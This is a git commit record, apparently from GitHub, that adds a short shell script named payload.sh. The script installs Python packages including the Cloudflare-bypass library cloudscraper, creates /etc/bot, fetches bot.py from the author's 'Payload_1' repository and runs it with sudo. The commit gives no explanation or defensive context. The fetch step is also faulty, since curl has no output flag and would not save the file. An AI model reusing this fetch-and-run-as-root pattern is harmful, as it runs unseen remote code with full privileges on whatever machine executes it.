4f4bab8e5440f1fedecc3d3a051f34d5e3e446e2
ywvytlwexh <161135338+ywvytlwexh@users.noreply.github.com>
2024-02-29 16:00:50 +0700

    Add files via upload

---
+++ payload.sh
@@ -0,0 +1,7 @@
+sudo apt-get install python3
+sudo pip3 install cloudscraper requests
+cd /etc
+mkdir bot
+cd /etc/bot
+curl https://raw.githubusercontent.com/ywvytlwexh/Payload_1/main/bot.py
+sudo python3 bot.py
